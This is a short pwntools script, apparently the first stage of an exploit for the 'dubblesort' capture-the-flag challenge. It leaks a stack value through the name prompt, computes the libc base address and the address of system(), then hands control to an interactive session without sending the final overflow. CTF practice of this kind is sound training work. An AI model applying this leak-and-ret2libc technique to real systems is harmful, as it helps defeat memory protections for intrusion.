from pwn import *


libc_start = 0xF7FD4000
libc_ref = 0xF7F97E24

libc_offset = libc_ref - libc_start

libc = ELF('./libc_32.so.6')

system_offset = libc.symbols['system']

local = True

if local:
    p = process("./dubblesort")
else:
    p = remote("chall.pwnable.tw",10101)

print("Going to Leak the Libc base address.")

p.recvuntil("What your name :")

leaker = "A"*7 + "\n"

print("The leaker is %d bytes"%len(leaker))

print("Sending the leaker [\\x%s]"%'\\x'.join(x.encode('hex') for x in leaker))

p.send(leaker)

p.recvuntil("Hello ")

leak = p.recvuntil(",").split("\n")[1][:4]

print("The leaked String    is:\t[%s]"%leak)

leak = u32(leak)

print("The leaked address   is:\t[0x%x]"%leak)

libc_add = leak - libc_offset

print("The Libc base addrss is:\t[0x%x]"%libc_add)

system_add = system_offset + libc_add

print("The System addrss    is:\t[0x%x]"%system_add)

p.recvuntil("sort :")

p.interactive()